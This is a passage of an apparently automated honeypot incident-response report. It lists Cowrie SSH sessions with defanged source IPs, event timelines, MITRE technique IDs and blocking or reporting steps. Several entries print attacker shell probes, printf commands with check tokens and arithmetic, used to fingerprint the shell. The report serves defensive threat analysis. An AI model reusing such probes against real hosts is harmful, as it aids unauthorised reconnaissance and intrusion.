| `2026-11-11 00:35:24` | `cowrie.login.success` |
| `2026-11-11 00:35:29` | `cowrie.client.size` |
| `2026-11-11 00:35:32` | `cowrie.session.params` |
| `2026-11-11 00:35:34` | `cowrie.command.input` |
| `2026-11-11 00:35:34` | `cowrie.command.input` |
| `2026-11-11 00:35:34` | `cowrie.command.input` |
| `2026-11-11 00:35:34` | `cowrie.command.input` |
| `2026-11-11 00:35:34` | `cowrie.command.input` |
| `2026-11-11 00:35:34` | `cowrie.command.input` |
| `2026-11-11 00:35:34` | `cowrie.command.input` |
| `2026-11-11 00:35:34` | `cowrie.command.input` |
| `2026-11-11 00:35:34` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1266928001e1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:37 |
| **Last Seen** | 2026-11-11 00:38 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_12fce001f19ff6dd8d2c9ce733cda702_small_control'"'"' '"'"'check_12fce001f19ff6dd8d2c9ce733cda702'"'"'', printf '\n%s|%s\n' 'check_12fce001f19ff6dd8d2c9ce733cda702_small_control' 'check_12fce001f19ff6dd8d2c9ce733cda702', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_12fce001f19ff6dd8d2c9ce733cda702_small_math'"'"' "$((873*859+11))"', (873*859+11, printf '\n%s|%s\n' 'check_12fce001f19ff6dd8d2c9ce733cda702_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:37:47` | `cowrie.session.connect` |
| `2026-11-11 00:37:49` | `cowrie.client.version` |
| `2026-11-11 00:37:49` | `cowrie.client.kex` |
| `2026-11-11 00:38:03` | `cowrie.login.success` |
| `2026-11-11 00:38:07` | `cowrie.client.size` |
| `2026-11-11 00:38:09` | `cowrie.session.params` |
| `2026-11-11 00:38:10` | `cowrie.command.input` |
| `2026-11-11 00:38:10` | `cowrie.command.input` |
| `2026-11-11 00:38:10` | `cowrie.command.input` |
| `2026-11-11 00:38:10` | `cowrie.command.input` |
| `2026-11-11 00:38:10` | `cowrie.command.input` |
| `2026-11-11 00:38:10` | `cowrie.command.input` |
| `2026-11-11 00:38:10` | `cowrie.command.input` |
| `2026-11-11 00:38:10` | `cowrie.command.input` |
| `2026-11-11 00:38:10` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c48d25de2ba

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:40 |
| **Last Seen** | 2026-11-11 00:40 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b916f9770b407e0b5dcc26a3b26f29cd_small_control'"'"' '"'"'check_b916f9770b407e0b5dcc26a3b26f29cd'"'"'', printf '\n%s|%s\n' 'check_b916f9770b407e0b5dcc26a3b26f29cd_small_control' 'check_b916f9770b407e0b5dcc26a3b26f29cd', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b916f9770b407e0b5dcc26a3b26f29cd_small_math'"'"' "$((524*440+47))"', (524*440+47, printf '\n%s|%s\n' 'check_b916f9770b407e0b5dcc26a3b26f29cd_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:40:23` | `cowrie.session.connect` |
| `2026-11-11 00:40:24` | `cowrie.client.version` |
| `2026-11-11 00:40:24` | `cowrie.client.kex` |
| `2026-11-11 00:40:32` | `cowrie.login.success` |
| `2026-11-11 00:40:36` | `cowrie.client.size` |
| `2026-11-11 00:40:37` | `cowrie.session.params` |
| `2026-11-11 00:40:39` | `cowrie.command.input` |
| `2026-11-11 00:40:39` | `cowrie.command.input` |
| `2026-11-11 00:40:39` | `cowrie.command.input` |
| `2026-11-11 00:40:39` | `cowrie.command.input` |
| `2026-11-11 00:40:39` | `cowrie.command.input` |
| `2026-11-11 00:40:39` | `cowrie.command.input` |
| `2026-11-11 00:40:39` | `cowrie.command.input` |
| `2026-11-11 00:40:39` | `cowrie.command.input` |
| `2026-11-11 00:40:39` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c23a5028dea3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:42 |
| **Last Seen** | 2026-11-11 00:43 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1546486d88c94509bc0336f879524878_small_control'"'"' '"'"'check_1546486d88c94509bc0336f879524878'"'"'', printf '\n%s|%s\n' 'check_1546486d88c94509bc0336f879524878_small_control' 'check_1546486d88c94509bc0336f879524878', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1546486d88c94509bc0336f879524878_small_math'"'"' "$((462*704+15))"', (462*704+15, printf '\n%s|%s\n' 'check_1546486d88c94509bc0336f879524878_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:42:57` | `cowrie.session.connect` |
| `2026-11-11 00:42:58` | `cowrie.client.version` |
| `2026-11-11 00:42:58` | `cowrie.client.kex` |
| `2026-11-11 00:43:06` | `cowrie.login.success` |
| `2026-11-11 00:43:10` | `cowrie.client.size` |
| `2026-11-11 00:43:12` | `cowrie.session.params` |
| `2026-11-11 00:43:14` | `cowrie.command.input` |
| `2026-11-11 00:43:14` | `cowrie.command.input` |
| `2026-11-11 00:43:14` | `cowrie.command.input` |
| `2026-11-11 00:43:14` | `cowrie.command.input` |
| `2026-11-11 00:43:14` | `cowrie.command.input` |
| `2026-11-11 00:43:14` | `cowrie.command.input` |
| `2026-11-11 00:43:14` | `cowrie.command.input` |
| `2026-11-11 00:43:14` | `cowrie.command.input` |
| `2026-11-11 00:43:14` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2efff4c9121

| Field | Detail |
|---|---|
| **Source IP** | `103.102.46[.]200` |
| **First Seen** | 2026-11-11 00:44 |
| **Last Seen** | 2026-11-11 00:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:44:46` | `cowrie.session.connect` |
| `2026-11-11 00:44:47` | `cowrie.client.version` |
| `2026-11-11 00:44:47` | `cowrie.client.kex` |
| `2026-11-11 00:44:55` | `cowrie.login.success` |
| `2026-11-11 00:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.102.46[.]200` to AbuseIPDB if not already reported
- [ ] Block `103.102.46[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6669b66eb841

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:45 |
| **Last Seen** | 2026-11-11 00:45 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_271a0472de77eeb677aa41e5ccde029f_small_control'"'"' '"'"'check_271a0472de77eeb677aa41e5ccde029f'"'"'', printf '\n%s|%s\n' 'check_271a0472de77eeb677aa41e5ccde029f_small_control' 'check_271a0472de77eeb677aa41e5ccde029f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_271a0472de77eeb677aa41e5ccde029f_small_math'"'"' "$((41*148+20))"', (41*148+20, printf '\n%s|%s\n' 'check_271a0472de77eeb677aa41e5ccde029f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:45:28` | `cowrie.session.connect` |
| `2026-11-11 00:45:30` | `cowrie.client.version` |
| `2026-11-11 00:45:30` | `cowrie.client.kex` |
| `2026-11-11 00:45:35` | `cowrie.login.success` |
| `2026-11-11 00:45:38` | `cowrie.client.size` |
| `2026-11-11 00:45:40` | `cowrie.session.params` |
| `2026-11-11 00:45:41` | `cowrie.command.input` |
| `2026-11-11 00:45:41` | `cowrie.command.input` |
| `2026-11-11 00:45:41` | `cowrie.command.input` |
| `2026-11-11 00:45:41` | `cowrie.command.input` |
| `2026-11-11 00:45:41` | `cowrie.command.input` |
| `2026-11-11 00:45:41` | `cowrie.command.input` |
| `2026-11-11 00:45:41` | `cowrie.command.input` |
| `2026-11-11 00:45:41` | `cowrie.command.input` |
| `2026-11-11 00:45:41` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3884f5261e5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:47 |
| **Last Seen** | 2026-11-11 00:48 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b3731b36aa5fa8ce3e6eb7784f3df1f5_small_control'"'"' '"'"'check_b3731b36aa5fa8ce3e6eb7784f3df1f5'"'"'', printf '\n%s|%s\n' 'check_b3731b36aa5fa8ce3e6eb7784f3df1f5_small_control' 'check_b3731b36aa5fa8ce3e6eb7784f3df1f5', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b3731b36aa5fa8ce3e6eb7784f3df1f5_small_math'"'"' "$((78*30+59))"', (78*30+59, printf '\n%s|%s\n' 'check_b3731b36aa5fa8ce3e6eb7784f3df1f5_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:47:55` | `cowrie.session.connect` |
| `2026-11-11 00:47:56` | `cowrie.client.version` |
| `2026-11-11 00:47:56` | `cowrie.client.kex` |
| `2026-11-11 00:48:06` | `cowrie.login.success` |
| `2026-11-11 00:48:12` | `cowrie.client.size` |
| `2026-11-11 00:48:15` | `cowrie.session.params` |
| `2026-11-11 00:48:18` | `cowrie.command.input` |
| `2026-11-11 00:48:18` | `cowrie.command.input` |
| `2026-11-11 00:48:18` | `cowrie.command.input` |
| `2026-11-11 00:48:18` | `cowrie.command.input` |
| `2026-11-11 00:48:18` | `cowrie.command.input` |
| `2026-11-11 00:48:18` | `cowrie.command.input` |
| `2026-11-11 00:48:18` | `cowrie.command.input` |
| `2026-11-11 00:48:18` | `cowrie.command.input` |
| `2026-11-11 00:48:18` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65f343fc3839

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:50 |
| **Last Seen** | 2026-11-11 00:50 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bfcdf7f0591bac7d7c64ed32c8238dff_small_control'"'"' '"'"'check_bfcdf7f0591bac7d7c64ed32c8238dff'"'"'', printf '\n%s|%s\n' 'check_bfcdf7f0591bac7d7c64ed32c8238dff_small_control' 'check_bfcdf7f0591bac7d7c64ed32c8238dff', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bfcdf7f0591bac7d7c64ed32c8238dff_small_math'"'"' "$((249*49+20))"', (249*49+20, printf '\n%s|%s\n' 'check_bfcdf7f0591bac7d7c64ed32c8238dff_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:50:34` | `cowrie.session.connect` |
| `2026-11-11 00:50:35` | `cowrie.client.version` |
| `2026-11-11 00:50:35` | `cowrie.client.kex` |
| `2026-11-11 00:50:40` | `cowrie.login.success` |
| `2026-11-11 00:50:44` | `cowrie.client.size` |
| `2026-11-11 00:50:46` | `cowrie.session.params` |
| `2026-11-11 00:50:49` | `cowrie.command.input` |
| `2026-11-11 00:50:49` | `cowrie.command.input` |
| `2026-11-11 00:50:49` | `cowrie.command.input` |
| `2026-11-11 00:50:49` | `cowrie.command.input` |
| `2026-11-11 00:50:49` | `cowrie.command.input` |
| `2026-11-11 00:50:49` | `cowrie.command.input` |
| `2026-11-11 00:50:49` | `cowrie.command.input` |
| `2026-11-11 00:50:49` | `cowrie.command.input` |
| `2026-11-11 00:50:49` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6da0d9b8fc44

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-11-11 00:51 |
| **Last Seen** | 2026-11-11 00:51 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:51:18` | `cowrie.session.connect` |
| `2026-11-11 00:51:19` | `cowrie.login.success` |
| `2026-11-11 00:51:20` | `cowrie.login.success` |
| `2026-11-11 00:51:20` | `cowrie.session.params` |
| `2026-11-11 00:51:21` | `cowrie.command.input` |
| `2026-11-11 00:51:21` | `cowrie.command.failed` |
| `2026-11-11 00:51:21` | `cowrie.command.input` |
| `2026-11-11 00:51:21` | `cowrie.command.failed` |
| `2026-11-11 00:51:22` | `cowrie.command.input` |
| `2026-11-11 00:51:22` | `cowrie.command.input` |
| `2026-11-11 00:51:22` | `cowrie.command.failed` |
| `2026-11-11 00:51:22` | `cowrie.command.failed` |
| `2026-11-11 00:51:52` | `cowrie.log.closed` |
| `2026-11-11 00:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3c7e2a6ee84

| Field | Detail |
|---|---|
| **Source IP** | `14.33.48[.]192` |
| **First Seen** | 2026-11-11 00:51 |
| **Last Seen** | 2026-11-11 00:52 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:51:52` | `cowrie.session.connect` |
| `2026-11-11 00:51:54` | `cowrie.login.success` |
| `2026-11-11 00:51:54` | `cowrie.session.params` |
| `2026-11-11 00:51:55` | `cowrie.command.input` |
| `2026-11-11 00:51:55` | `cowrie.command.failed` |
| `2026-11-11 00:51:55` | `cowrie.command.input` |
| `2026-11-11 00:51:55` | `cowrie.command.failed` |
| `2026-11-11 00:51:56` | `cowrie.command.input` |
| `2026-11-11 00:51:56` | `cowrie.command.failed` |
| `2026-11-11 00:51:56` | `cowrie.command.input` |
| `2026-11-11 00:51:56` | `cowrie.command.failed` |
| `2026-11-11 00:51:56` | `cowrie.command.input` |
| `2026-11-11 00:51:56` | `cowrie.command.input` |
| `2026-11-11 00:51:56` | `cowrie.command.failed` |
| `2026-11-11 00:51:56` | `cowrie.command.failed` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `14.33.48[.]192` to AbuseIPDB if not already reported
- [ ] Block `14.33.48[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b8b10df82ce

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:53 |
| **Last Seen** | 2026-11-11 00:54 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1c036f9a99fa413566e0da9c36405563_small_control'"'"' '"'"'check_1c036f9a99fa413566e0da9c36405563'"'"'', printf '\n%s|%s\n' 'check_1c036f9a99fa413566e0da9c36405563_small_control' 'check_1c036f9a99fa413566e0da9c36405563', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_1c036f9a99fa413566e0da9c36405563_small_math'"'"' "$((193*823+91))"', (193*823+91, printf '\n%s|%s\n' 'check_1c036f9a99fa413566e0da9c36405563_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:53:40` | `cowrie.session.connect` |
| `2026-11-11 00:53:41` | `cowrie.client.version` |
| `2026-11-11 00:53:41` | `cowrie.client.kex` |
| `2026-11-11 00:53:45` | `cowrie.login.success` |
| `2026-11-11 00:53:54` | `cowrie.client.size` |
| `2026-11-11 00:53:55` | `cowrie.session.params` |
| `2026-11-11 00:53:57` | `cowrie.command.input` |
| `2026-11-11 00:53:57` | `cowrie.command.input` |
| `2026-11-11 00:53:57` | `cowrie.command.input` |
| `2026-11-11 00:53:57` | `cowrie.command.input` |
| `2026-11-11 00:53:57` | `cowrie.command.input` |
| `2026-11-11 00:53:57` | `cowrie.command.input` |
| `2026-11-11 00:53:57` | `cowrie.command.input` |
| `2026-11-11 00:53:57` | `cowrie.command.input` |
| `2026-11-11 00:53:57` | `cowrie.command.input` |
| … | _26 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8591e1a848f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:56 |
| **Last Seen** | 2026-11-11 00:56 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d48c0a6f00919ea12c9579195f5801a0_small_control'"'"' '"'"'check_d48c0a6f00919ea12c9579195f5801a0'"'"'', printf '\n%s|%s\n' 'check_d48c0a6f00919ea12c9579195f5801a0_small_control' 'check_d48c0a6f00919ea12c9579195f5801a0', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d48c0a6f00919ea12c9579195f5801a0_small_math'"'"' "$((575*690+93))"', (575*690+93, printf '\n%s|%s\n' 'check_d48c0a6f00919ea12c9579195f5801a0_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:56:33` | `cowrie.session.connect` |
| `2026-11-11 00:56:34` | `cowrie.client.version` |
| `2026-11-11 00:56:34` | `cowrie.client.kex` |
| `2026-11-11 00:56:41` | `cowrie.login.success` |
| `2026-11-11 00:56:45` | `cowrie.client.size` |
| `2026-11-11 00:56:46` | `cowrie.session.params` |
| `2026-11-11 00:56:49` | `cowrie.command.input` |
| `2026-11-11 00:56:49` | `cowrie.command.input` |
| `2026-11-11 00:56:49` | `cowrie.command.input` |
| `2026-11-11 00:56:49` | `cowrie.command.input` |
| `2026-11-11 00:56:49` | `cowrie.command.input` |
| `2026-11-11 00:56:49` | `cowrie.command.input` |
| `2026-11-11 00:56:49` | `cowrie.command.input` |
| `2026-11-11 00:56:49` | `cowrie.command.input` |
| `2026-11-11 00:56:49` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5683a709f63c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-11-11 00:59 |
| **Last Seen** | 2026-11-11 00:59 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_51ac278fe8694ad57e6d51fd2131c98c_small_control'"'"' '"'"'check_51ac278fe8694ad57e6d51fd2131c98c'"'"'', printf '\n%s|%s\n' 'check_51ac278fe8694ad57e6d51fd2131c98c_small_control' 'check_51ac278fe8694ad57e6d51fd2131c98c', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_51ac278fe8694ad57e6d51fd2131c98c_small_math'"'"' "$((969*218+54))"', (969*218+54, printf '\n%s|%s\n' 'check_51ac278fe8694ad57e6d51fd2131c98c_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 00:59:28` | `cowrie.session.connect` |
| `2026-11-11 00:59:28` | `cowrie.client.version` |
| `2026-11-11 00:59:28` | `cowrie.client.kex` |
| `2026-11-11 00:59:34` | `cowrie.login.success` |
| `2026-11-11 00:59:36` | `cowrie.client.size` |
| `2026-11-11 00:59:38` | `cowrie.session.params` |
| `2026-11-11 00:59:39` | `cowrie.command.input` |
| `2026-11-11 00:59:39` | `cowrie.command.input` |
| `2026-11-11 00:59:39` | `cowrie.command.input` |
| `2026-11-11 00:59:39` | `cowrie.command.input` |
| `2026-11-11 00:59:39` | `cowrie.command.input` |
| `2026-11-11 00:59:39` | `cowrie.command.input` |
| `2026-11-11 00:59:39` | `cowrie.command.input` |
| `2026-11-11 00:59:39` | `cowrie.command.input` |
| `2026-11-11 00:59:39` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (58) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-3d5508fbd1e2 | HIGH | `176.53.159[.]196` | 2026-11-11 01:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ac1ededfea4e | HIGH | `195.178.110[.]78` | 2026-11-11 01:10 | Y | 3 | 0 | `T1078 · T1083` |
| IR-689b8e457cea | HIGH | `195.178.110[.]217` | 2026-11-11 01:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f09abfee05eb | HIGH | `195.178.110[.]217` | 2026-11-11 01:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6ac37538cafc | HIGH | `195.178.110[.]217` | 2026-11-11 01:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-200845786471 | HIGH | `195.178.110[.]217` | 2026-11-11 01:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8cb5588ad3b1 | HIGH | `195.178.110[.]217` | 2026-11-11 01:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-afea447e495d | HIGH | `195.178.110[.]217` | 2026-11-11 01:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4dfe6436881b | HIGH | `34.40.145[.]110` | 2026-11-11 01:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-21999852d8cc | HIGH | `34.40.145[.]110` | 2026-11-11 01:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c5c08c6bfcc6 | HIGH | `195.178.110[.]217` | 2026-11-11 01:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fbd870d8346b | HIGH | `195.178.110[.]217` | 2026-11-11 01:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-357c0c226ef7 | HIGH | `195.178.110[.]217` | 2026-11-11 01:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c640b6469ab7 | HIGH | `78.128.112[.]74` | 2026-11-11 01:28 | Y | 1 | 0 | `T1078 · T1592` |
| IR-15f830b20957 | HIGH | `195.178.110[.]217` | 2026-11-11 01:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-02531add94db | HIGH | `195.178.110[.]217` | 2026-11-11 01:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-16d618dab072 | HIGH | `195.178.110[.]217` | 2026-11-11 01:32 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7b77c86d4960 | HIGH | `195.178.110[.]217` | 2026-11-11 01:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7f7cd58cb078 | HIGH | `195.178.110[.]217` | 2026-11-11 01:36 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-96161f5ffe53 | HIGH | `195.178.110[.]217` | 2026-11-11 01:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7c13fd9f4dab | HIGH | `195.178.110[.]217` | 2026-11-11 01:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f4cb6bc06762 | HIGH | `195.178.110[.]217` | 2026-11-11 01:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-46b063cf4d54 | HIGH | `195.178.110[.]217` | 2026-11-11 01:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-96dbc02ea701 | HIGH | `195.178.110[.]217` | 2026-11-11 01:44 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-28c20523a1b9 | HIGH | `195.178.110[.]217` | 2026-11-11 01:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-99944da9f1af | HIGH | `195.178.110[.]217` | 2026-11-11 01:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5b1ddbca570a | HIGH | `195.178.110[.]217` | 2026-11-11 01:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-52f7fa606a5c | HIGH | `195.178.110[.]217` | 2026-11-11 01:52 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7d0cac97114c | HIGH | `195.178.110[.]217` | 2026-11-11 01:53 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ee7fcb460a45 | HIGH | `195.178.110[.]217` | 2026-11-11 01:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-28c9f05cf44a | HIGH | `195.178.110[.]217` | 2026-11-11 01:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-79e717c45532 | HIGH | `195.178.110[.]217` | 2026-11-11 01:58 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-98f1d33bc231 | HIGH | `195.178.110[.]217` | 2026-11-11 02:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-878bc4e4a955 | HIGH | `195.178.110[.]217` | 2026-11-11 02:02 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-43b052b0f447 | HIGH | `195.178.110[.]217` | 2026-11-11 02:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
